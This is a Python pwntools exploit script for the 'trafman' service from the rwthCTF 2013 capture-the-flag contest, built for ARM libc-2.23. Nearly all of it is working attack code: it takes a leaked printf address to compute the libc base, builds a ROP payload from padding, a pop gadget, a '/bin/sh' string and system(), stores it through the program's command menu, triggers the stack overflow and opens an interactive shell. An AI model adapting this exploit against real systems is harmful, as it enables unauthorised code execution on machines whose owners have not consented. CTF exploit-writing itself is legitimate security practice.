#!/usr/bin/env python

# exploit for trafman (from rwthCTF 2013)
# works for arm-linux-gnueabihf libc-2.23

from pwn import *
import subprocess
import sys
import time

HOST = "localhost"
PORT = 12201
ELF_PATH = "./real_trafman"
LIBC_PATH = "/usr/arm-linux-gnueabihf/lib/libc.so.6"

# setting 
#context.arch = 'amd64'
#context.arch = 'i386'
context.arch = 'arm'
context.os = 'linux'
context.endian = 'little'
#context.word_size = 32
context.bits = 32
elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
	return subprocess.check_output(cmd, shell=True)

def exec_cmd(r, ID, cmd):
    r.sendline("2")
    r.recvuntil("([a-fA-F0-9]{40}):\n")
    r.sendline(ID)
    r.recvuntil("command:\n")
    r.sendline(cmd)

def get_cmd(r, ID):
    r.sendline("1")
    r.recvuntil("for:\n")
    r.sendline(ID)

if __name__ == "__main__":

    #r = remote(HOST, PORT)
    r = process("./trafman")

    r.recvuntil("Username: ")
    r.sendline("traffic_operator")
    r.recvuntil("Please enter a number:\n")
    
    # leak libc address
    r.sendline("23")
    r.recvuntil("> ")
    printf_addr = int(r.recvline().strip(), 16)
    libc_base = printf_addr - libc.symbols['printf']
    libc.address += libc_base
    system_addr = libc.symbols['system']
    pop_addr = libc_base + 0x56b7c # pop r0, r4, pc
    binsh = libc_base + 0xca574 #sh\x00
    log.info("printf_addr: "+hex(printf_addr))
    log.info("libc_base: "+hex(libc_base))
    log.info("pop_addr: "+hex(pop_addr))
    log.info("binsh: "+hex(binsh))
    log.info("system_addr: "+hex(system_addr))
    # sending payload
    payload = "A"*276 # padding
    payload += p32(pop_addr) # pop r0, r4, pc
    payload += p32(binsh)
    payload += "AAAA"
    payload += p32(system_addr)
   
    r.recvuntil("Please enter a number:\n")
    exec_cmd(r, "A"*40, payload)
    
    # trigger BOF
    r.recvuntil("Please enter a number:\n")
    get_cmd(r, "A"*40)

    r.interactive()
